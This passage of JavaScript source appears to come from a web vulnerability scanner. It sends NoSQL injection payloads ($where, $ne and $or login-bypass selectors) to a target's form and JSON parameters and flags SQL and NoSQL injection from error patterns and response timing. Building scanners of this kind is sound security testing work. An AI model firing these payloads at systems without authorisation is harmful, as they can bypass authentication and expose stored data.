      '{"selector": {"$or": [{"username": "admin"}, {"_id": {"$ne": null}}]}}',
      
      // General NoSQL payloads
      'true, $where: "1 == 1"',
      '", $where: "1 == 1", $comment: "',
      '{"$comment": "injection", "$where": "this.username"}',
      '[$ne]=1'
    ];

    for (const [paramKey, paramInfo] of parameterMap) {
      // Focus on JSON-based endpoints for NoSQL testing
      if (paramInfo.location === 'json' || paramInfo.type === 'ajax') {
        for (let i = 0; i < noSQLPayloads.length; i++) {
          const payload = noSQLPayloads[i];
          this.logger.progress(i + 1, noSQLPayloads.length, `Testing NoSQL ${paramKey.split(':').pop()}`);
          
          try {
            const response = await this.sendNoSQLPayload(baseUrl, paramKey, paramInfo, payload);
            
            if (response) {
              const vulnerability = this.analyzeNoSQLResponse(response, payload, paramKey, paramInfo);
              if (vulnerability) {
                this.vulnerabilities.push(vulnerability);
                
                this.logger.logSQLInjection({
                  url: vulnerability.url,
                  parameter: vulnerability.parameter,
                  payload: payload,
                  evidence: vulnerability.evidence,
                  dbType: 'NoSQL'
                });
              }
            }

          } catch (error) {
            this.logger.debug(`NoSQL injection test failed: ${error.message}`);
          }
        }
      }
    }
  }

  async sendPayload(baseUrl, paramKey, paramInfo, payload) {
    try {
      if (paramInfo.type === 'url' || paramInfo.method === 'GET') {
        const testUrl = new URL(baseUrl);
        const paramName = paramKey.includes(':') ? paramKey.split(':').pop() : paramKey;
        testUrl.searchParams.set(paramName, payload);
        
        return await axios.get(testUrl.href, {
          timeout: 10000,
          validateStatus: () => true,
          headers: {
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          }
        });
      } else if (paramInfo.type === 'form') {
        const formData = new URLSearchParams();
        const paramName = paramKey.split(':').pop();
        formData.append(paramName, payload);
        
        return await axios.post(paramInfo.url || baseUrl, formData, {
          timeout: 10000,
          validateStatus: () => true,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          }
        });
      } else if (paramInfo.location === 'json') {
        const paramName = paramKey.split(':').pop();
        const jsonData = { [paramName]: payload };
        
        return await axios.post(paramInfo.url || baseUrl, jsonData, {
          timeout: 10000,
          validateStatus: () => true,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          }
        });
      }
    } catch (error) {
      return null;
    }
  }

  async sendNoSQLPayload(baseUrl, paramKey, paramInfo, payload) {
    try {
      const paramName = paramKey.split(':').pop();
      let jsonData;

      // Try to parse payload as JSON, otherwise use as string
      try {
        jsonData = { [paramName]: JSON.parse(payload) };
      } catch {
        jsonData = { [paramName]: payload };
      }

      return await axios.post(paramInfo.url || baseUrl, jsonData, {
        timeout: 10000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });
    } catch (error) {
      return null;
    }
  }

  analyzeResponse(response, payload, responseTime, paramKey, paramInfo) {
    const indicators = [];
    let severity = 'Medium';
    let confidence = 'Low';

    // SQL error patterns
    const errorPatterns = [
      /sql syntax.*mysql/i,
      /warning.*mysql_/i,
      /valid mysql result/i,
      /mysqlexception/i,
      /sqlexception/i,
      /ora-\d{5}/i,
      /microsoft.*odbc.*sql/i,
      /postgresql.*error/i,
      /warning.*pg_/i,
      /valid postgresql result/i,
      /sqlite.*error/i,
      /sqlite3\.operationalerror/i,
      /sql server.*error/i,
      /unclosed quotation mark/i,
      /quoted string not properly terminated/i
    ];

    // Check for SQL errors
    const hasError = errorPatterns.some(pattern => {
      if (pattern.test(response.data)) {
        indicators.push('SQL error message detected');
        severity = 'Critical';
        confidence = 'High';
        return true;
      }
      return false;
    });

    // Check for time-based injection
    if (responseTime > 4000) {
      indicators.push('Significant response delay detected');
      severity = 'High';
      confidence = 'Medium';
    }

    // Check for boolean-based differences
    if (payload.includes('1=1') || payload.includes("'1'='1'")) {
      // This would need baseline comparison in real implementation
      indicators.push('Boolean-based payload sent');
      confidence = 'Low';
    }

    // Check for UNION-based injection success
    if (payload.includes('UNION') && response.data.length > 1000) {
      indicators.push('Large response to UNION payload');
      severity = 'Critical';
      confidence = 'Medium';
    }

    if (indicators.length > 0) {
      return {
        type: 'SQL Injection',
        severity: severity,
        url: this.getTestUrl(response.config?.url || '', paramKey, paramInfo),
        parameter: paramKey.split(':').pop(),
        payload: payload,
        evidence: indicators.join(', '),
        response: response.data.substring(0, 500),
        responseTime: responseTime,
        confidence: confidence,
        timestamp: new Date().toISOString()
      };
    }

    return null;
  }

  analyzeNoSQLResponse(response, payload, paramKey, paramInfo) {
    const indicators = [];
    let severity = 'Medium';
    let confidence = 'Low';

    // NoSQL error patterns
    const noSQLErrorPatterns = [
      /mongodb.*error/i,
      /couchdb.*error/i,
      /redis.*error/i,
      /cassandra.*error/i,
      /dynamodb.*error/i,
      /\$where.*error/i,
      /\$regex.*error/i,
      /invalid.*query/i,
      /syntax.*error.*query/i
    ];

    // Check for NoSQL errors
    const hasError = noSQLErrorPatterns.some(pattern => {
      if (pattern.test(response.data)) {
        indicators.push('NoSQL error message detected');
        severity = 'High';
        confidence = 'High';
        return true;
      }
      return false;
    });

    // Check for successful authentication bypass patterns
    if (response.status === 200 && (
      response.data.includes('admin') ||
      response.data.includes('user') ||
      response.data.includes('token') ||
      response.data.includes('success')
    )) {
      indicators.push('Potential authentication bypass');
      severity = 'Critical';
      confidence = 'Medium';
    }

    // Check for data leakage
    if (response.data.includes('{') && response.data.includes('}') && response.data.length > 500) {
      indicators.push('Large JSON response indicating potential data extraction');
      severity = 'High';
      confidence = 'Medium';
    }

    if (indicators.length > 0) {
      return {
        type: 'NoSQL Injection',
        severity: severity,
        url: this.getTestUrl(response.config?.url || '', paramKey, paramInfo),
        parameter: paramKey.split(':').pop(),
        payload: payload,
        evidence: indicators.join(', '),
        response: response.data.substring(0, 500),
        confidence: confidence,
        timestamp: new Date().toISOString()
      };
    }

    return null;
  }

  getTestUrl(baseUrl, paramKey, paramInfo) {
    if (paramInfo.url) {
      return paramInfo.url;
    }
    
    if (paramKey.includes(':')) {
      return paramKey.split(':')[0];
    }
    
    return baseUrl;
  }

  hashResponse(responseData) {
    const crypto = require('crypto');
    return crypto.createHash('md5').update(responseData).digest('hex');
  }

  async generateResults(target, parameterMap, dbInfo) {
    const duration = Date.now() - this.startTime;
    const results = {
      target,
      timestamp: new Date().toISOString(),
      duration: `${Math.round(duration / 1000)}s`,
      databaseInfo: dbInfo,
      parametersAnalyzed: parameterMap.size,
      injectionPoints: this.injectionPoints.size,
      vulnerabilities: this.vulnerabilities,
      total: this.vulnerabilities.length,
      critical: this.vulnerabilities.filter(v => v.severity === 'Critical').length,
      high: this.vulnerabilities.filter(v => v.severity === 'High').length,
      medium: this.vulnerabilities.filter(v => v.severity === 'Medium').length,
      low: this.vulnerabilities.filter(v => v.severity === 'Low').length,
      info: this.vulnerabilities.filter(v => v.severity === 'Info').length
    };

    return results;
  }
}

module.exports = SQLAnalyzer;